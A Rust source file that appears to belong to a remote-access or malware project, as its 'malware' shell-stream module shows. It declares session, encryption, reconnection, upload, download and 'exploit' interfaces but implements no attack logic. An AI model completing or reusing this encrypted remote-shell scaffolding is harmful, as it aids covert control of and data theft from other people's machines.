use std::{
    io::Error,
    net::{IpAddr, TcpStream, ToSocketAddrs}
};

use crate::{
    Application::malware::utils::shell::ShellStream,
    structure::utils::{
        enums::{
            EncryptType,
            HandshakeType,
            Packet,
            ParseError,
        },
        structs::{
            define::EncryptionInfo,
            define::StructStone
        }
    },
    utility::secure::{
        crypto::Crypto,
        utils::{AesGcmSivCrypto, RsaCrypto},
    },
};

pub struct Session {
    pub(crate) encryption: EncryptionInfo,
    pub(crate) socket: TcpStream,
    pub(crate) packet: Packet,
    pub(crate) cipher: Cipher,
}

pub(crate) struct Cipher {
    aes: AesGcmSivCrypto,
    rsa: RsaCrypto,
}

pub struct ProtocolEditor {
    session: Session,
    exploits: ShellStream,
}

type SResult<T> = std::io::Result<T>;

impl Session {
    pub fn take_packet(&self) -> &Packet { &self.packet }
    pub fn get_packet(&self) -> Packet { self.packet.clone() }
    pub fn set_packet(&mut self, packet: Packet) {
        self.packet = packet
    }
    pub fn take_socket(&self) -> &TcpStream {
        &self.socket
    }
    pub fn set(encryption: EncryptionInfo, socket: TcpStream, packet: Packet) -> Session {
        match &packet {
            Packet::StructStone { .. } |
            Packet::SecureHandshakePacket { .. } |
            Packet::SecurePacket { .. }
            => {
                let cipher = Cipher { aes: AesGcmSivCrypto::default(), rsa: RsaCrypto::default() };
                Session { encryption, socket, packet, cipher }
            }
        }
    }
    pub fn take_handshake_type(&self) -> &HandshakeType {
        &self.encryption.Handshake_Type
    }
    pub fn set_handshake(&mut self, handshake_type: HandshakeType) { self.encryption.Handshake_Type = handshake_type }
    pub fn set_encryption(&mut self, encryption: EncryptionInfo) {
        self.encryption = encryption;
        match self.encryption.Type {
            EncryptType::NoEncryption => {}
            _ => {
                self.cipher.aes.setup().expect("self.aes_cipher.setup()");
                self.cipher.rsa.setup().expect("self.rsa_cipher.setup()");
            }
        }
    }
}

pub trait PacketProcessing {
    fn take_packet<T>(&self) -> T;

    fn get_packet<T>(&self) -> T;

    fn set_packet<T>(&mut self, packet: T) -> T;
}

pub trait HandleSession {
    fn new<A: ToSocketAddrs>(address: A, packet: Packet) -> Result<(TcpStream,Packet), (Error, Packet)>;
    fn normal(address: IpAddr, packet: Packet) -> Session;
    fn secure(address: IpAddr, packet: Packet) -> Session;
    fn establish_connection(address: IpAddr, conn_type: EncryptionInfo, packet: Packet, attempts: u32) -> Session;
    fn optional(address: IpAddr, encryption: EncryptionInfo) -> Session;
    fn is_connected(&self) -> bool;
    fn reconnection(&mut self) -> Result<Session, Error>;
    fn encryption(&mut self) -> Result<(), ParseError>;
    fn decryption(&mut self) -> Result<(), ParseError>;
    fn send(&mut self) -> Result<Packet, Error>;
    fn recv(&mut self, buffer_size: usize) -> Vec<u8>;
    fn receiving(&mut self, buffer: StructStone) -> Packet;
    fn send_disconnect(&mut self) -> SResult<()>;
}

pub trait HandleProtocols {
    fn response(&mut self, msg: &str) -> SResult<Packet>;
    fn disconnect(&mut self);
    fn download(&mut self) -> SResult<Packet>;
    fn upload(&mut self) -> SResult<Packet>;
    fn exploit(&mut self) -> SResult<Packet>;
}

pub trait Handlers {
    fn default_client_handler(&mut self);
}